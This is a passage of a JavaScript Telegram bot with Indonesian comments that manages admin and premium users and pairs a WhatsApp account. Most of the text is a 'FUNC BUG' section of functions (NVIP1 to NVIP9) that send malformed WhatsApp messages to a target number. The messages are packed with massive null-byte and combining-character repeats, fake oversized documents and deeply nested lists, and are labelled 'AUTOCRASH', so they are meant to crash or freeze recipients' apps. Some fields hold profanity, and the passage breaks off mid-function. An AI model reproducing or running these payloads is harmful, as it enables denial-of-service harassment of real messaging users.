    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dijadikan Admin.\nContoh: /addadmin 123456789");
    }

    const userId = args[1];

    if (adminUsers.includes(userId)) {
        return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status Admin.`);
    }

    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);

    return ctx.reply(`🎉 Pengguna ${userId} sekarang memiliki akses Admin!`);
});

// Perintah untuk menghapus pengguna premium (hanya owner)
bot.command('delprem', checkAdmin, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 123456789");
    }

    const userId = args[1];

    if (!premiumUsers.includes(userId)) {
        return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
    }

    premiumUsers = premiumUsers.filter(id => id !== userId);
    saveJSON(premiumFile, premiumUsers);

    return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar premium.`);
});

bot.command('deladmin', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply("❌ Masukkan ID pengguna yang ingin dihapus dari Admin.\nContoh: /deladmin 123456789");
    }

    const userId = args[1];

    if (!adminUsers.includes(userId)) {
        return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
    }

    adminUsers = adminUsers.filter(id => id !== userId);
    saveJSON(adminFile, adminUsers);

    return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});
// Perintah untuk mengecek status premium
bot.command('cekprem', (ctx) => {
    const userId = ctx.from.id.toString();

    if (premiumUsers.includes(userId)) {
        return ctx.reply(`✅ Anda adalah pengguna premium.`);
    } else {
        return ctx.reply(`❌ Anda bukan pengguna premium.`);
    }
});

// Command untuk pairing WhatsApp
bot.command("connect", checkOwner, async (ctx) => {

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return await ctx.reply("❌ Format perintah salah. Gunakan: /connect <nomor_wa>");
    }

    let phoneNumber = args[1];
    phoneNumber = phoneNumber.replace(/[^0-9]/g, '');


    if (Aii && Aii.user) {
        return await ctx.reply("WhatsApp sudah terhubung. Tidak perlu pairing lagi.");
    }

    try {
        const code = await Aii.requestPairingCode(phoneNumber);
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

        const pairingMessage = `
\`\`\`✅𝗦𝘂𝗰𝗰𝗲𝘀𝘀
𝗞𝗼𝗱𝗲 𝗪𝗵𝗮𝘁𝘀𝗔𝗽𝗽 𝗔𝗻𝗱𝗮

𝗡𝗼𝗺𝗼𝗿: ${phoneNumber}
𝗞𝗼𝗱𝗲: ${formattedCode}\`\`\`
`;

        await ctx.replyWithMarkdown(pairingMessage);
    } catch (error) {
        console.error(chalk.red('Gagal melakukan pairing:'), error);
        await ctx.reply("❌ Gagal melakukan pairing. Pastikan nomor WhatsApp valid dan dapat menerima SMS.");
    }
});

// Fungsi untuk merestart bot menggunakan PM2
const restartBot = () => {
  pm2.connect((err) => {
    if (err) {
      console.error('Gagal terhubung ke PM2:', err);
      return;
    }

    pm2.restart('index', (err) => { // 'index' adalah nama proses PM2 Anda
      pm2.disconnect(); // Putuskan koneksi setelah restart
      if (err) {
        console.error('Gagal merestart bot:', err);
      } else {
        console.log('Bot berhasil direstart.');
      }
    });
  });
};

//~~~~~~~~~~~~~~~~~~~FUNC BUG~~~~~~~~~~~~~~~~~~~\\
async function NVIP1(target) {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
              contextInfo: {
              stanzaId: Aii.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 35675873277,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   "
                    },
                },
              },
            body: {
              text: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   " + "ꦾ".repeat(10000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_url",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_reminder",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "cta_cancel_reminder",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "address_message",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "send_location",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
              ],
            },
          },
        },
      },
    };
    await Aii.relayMessage(target, message, {
      participant: { jid: target },
    });
  }

async function NVIP2(target) {
      let sections = [];
      for (let i = 0; i < 10000; i++) {
        let largeText = "\u0000".repeat(900000);
        let deepNested = {
          title: "\u0000".repeat(900000),
          highlight_label: "\u0000".repeat(900000),
          rows: [
            {
              title: largeText,
              id: "\u0000".repeat(900000),
              subrows: [
                {
                  title: "\u0000".repeat(900000),
                  id: "\u0000".repeat(900000),
                  subsubrows: [
                    {
                      title: "\u0000".repeat(900000),
                      id: "\u0000".repeat(900000),
                    },
                    {
                      title: "\u0000".repeat(900000),
                      id: "\u0000".repeat(900000),
                    },
                  ],
                },
                {
                  title: "\u0000".repeat(900000),
                  id: "\u0000".repeat(900000),
                },
              ],
            },
          ],
        };
        sections.push(deepNested);
      }
      let listMessage = {
        title: "\u0000".repeat(900000),
        sections: sections,
      };
      let message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              contextInfo: {
              stanzaId: Aii.generateMessageTag(),
              participant: "0@s.whatsapp.net",
              mentionedJid: [target],
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 19316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
							},
					   },
              },
              body: {
                text: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   " + "ꦾ".repeat(10000)
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                {
                  name: "cta_url",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "cta_call",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "cta_copy",
                  buttonParamsJson: "JSON.stringify(listMessage)",
                },
                {
                  name: "address_message",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "send_location",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "quick_reply",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                {
                  name: "mpm",
                  buttonParamsJson: "\u0000".repeat(90000),
                },
                ],
              },
            },
          },
        },
      };
      await Aii.relayMessage(target, message, {
        participant: { jid: target },
    });
}

async function NVIP3(target) {
  const stanza = [
    {
      attrs: { biz_bot: "1" },
      tag: "bot",
    },
    {
      attrs: {},
      tag: "biz",
    },
  ];

  let messagePayload = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   " + "ꦾ".repeat(25000),
          listType: 2,
          singleSelectReply: {
            selectedRowId: "🩸",
          },
          contextInfo: {
            stanzaId: Aii.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                  mimetype:
                    "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                  fileLength: "9999999999999",
                  pageCount: 39567587327,
                  mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                  fileName: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
                  fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                  directPath:
                    "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1735456100",
                  contactVcard: true,
                  caption: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
                },
                contentText: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
                footerText: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
                buttons: [
                  {
                    buttonId: "\u0000".repeat(850000),
                    buttonText: {
                      displayText: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
              advertiserName: " x ",
              mediaType: "IMAGE",
              jpegThumbnail: "",
              caption: " x ",
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
              url: "t.me/testi_hwuwhw99",
              buttonTitle: "konstol",
            },
            disappearingMode: {
              initiator: 1,
              trigger: 2,
              initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
              title: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
              mediaType: 2,
              renderLargerThumbnail: false,
              showAdAttribution: false,
              containsAutoReply: false,
              body: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
              thumbnail: "",
              sourceUrl: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
              sourceId: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
              ctwaClid: "cta",
              ref: "ref",
              clickToWhatsappCall: true,
              automatedGreetingMessageShown: false,
              greetingMessageBody: "kontol",
              ctaPayload: "cta",
              disableNudge: true,
              originalImageUrl: "konstol",
            },
            featureEligibilities: {
              cannotBeReactedTo: true,
              cannotBeRanked: true,
              canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120363274419384848@newsletter",
              serverMessageId: 1,
              newsletterName: ` 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰     - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
              contentType: 3,
              accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
              utmSource: "utm",
              utmCampaign: "utm2",
            },
          },
          description: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒⃰   ",
        },
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16),
          }),
        },
      },
    },
  };

  await Aii.relayMessage(target, messagePayload, {
    participant: { jid: target},
  });
}

async function NVIP4(nomor) {
     let target = nomor
     let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: ""
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "single_select",
                                        buttonParamsJson: "z"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "{}"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});

            await Aii.relayMessage(target, msg.message, {
                messageId: msg.key.id,
                participant: { jid: target }
            });
        }

async function NVIP5(target) {
      let sections = [];

      for (let i = 0; i < 1; i++) {
        let largeText = "ꦾ".repeat(1);

        let deepNested = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [
            {
              title: largeText,
              id: `id${i}`,
              subrows: [
                {
                  title: "Nested row 1",
                  id: `nested_id1_${i}`,
                  subsubrows: [
                    {
                      title: "Deep Nested row 1",
                      id: `deep_nested_id1_${i}`,
                    },
                    {
                      title: "Deep Nested row 2",
                      id: `deep_nested_id2_${i}`,
                    },
                  ],
                },
                {
                  title: "Nested row 2",
                  id: `nested_id2_${i}`,
                },
              ],
            },
          ],
        };

        sections.push(deepNested);
      }

      let listMessage = {
        title: "Massive Menu Overflow",
        sections: sections,
      };

      let message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              contextInfo: {
                mentionedJid: [target],
                isForwarded: true,
                forwardingScore: 999,
                businessMessageForwardInfo: {
                  businessOwnerJid: target,
                },
              },
              body: {
                text: " 🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒  ",
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                ],
              },
            },
          },
        },
      };

      await Aii.relayMessage(target, message, {
        participant: { jid: target },
      });
    }

async function NVIP6(target) {
    const messagePayload = {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                fileLength: "999999999999",
                                pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                fileName: `🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒ 𐎟`,
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1715880173"
                            },
                        hasMediaAttachment: true
                    },
                    body: {
                            text: "🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒ 𐎟" + "ꦾ".repeat(150000) + "@1".repeat(250000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "ALWAYSAQIOO" }],
                        isForwarded: true,
                        quotedMessage: {
								documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "999999999999",
											pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Alwaysaqioo The Juftt️",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
						}
                    }
                    }
                }
            }
        }
    };

    Aii.relayMessage(target, messagePayload, { participant: { jid: target } }, { messageId: null });
}
//~~~~~~~~~~~~~~~~~~~END~~~~~~~~~~~~~~~~~\\

async function NVIP7(target) {
 let virtex = "🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒ 𐎟";
   Aii.relayMessage(target, {
     groupMentionedMessage: {
       message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "99999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "𝐈𝐍𝐃𝐈Σ𝐓𝐈𝐕𝚵 𝐅𝐋𝚯𝚯𝐃𝐁𝐔𝐑𝐒𝐇" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "𝙏𝙝𝙖𝙣" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };

async function NVIP8(target) {
var etc = generateWAMessageFromContent(target, ({
  'listMessage': {
    'title': "‌AUTOCRASH" + "ꦻ".repeat(777777) + "\u200b".repeat(88888) + '~@25~'.repeat(55555),
        'footerText': 'CRASH',
        'buttonText': 'AUTOCRASH',
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'Detech',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'BauGacor',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target });
await Aii.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function NVIP9(target) {
  try {
    await Aii.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "🦠⃟͒  ⃨⃨⃨𝐄𝐋 - 𝐒𝐀𝐋𝐕𝐀𝐃𝐎𝐑⃰͢⃟༑͢⃟༑𝐅𝐎𝐑𝐄𝐕𝐄𝐑 ヶ⃔͒ 𐎟\n" +
                  "ꦾ".repeat(92000) +
                  "ꦽ".repeat(92000) +
                  `@1`.repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
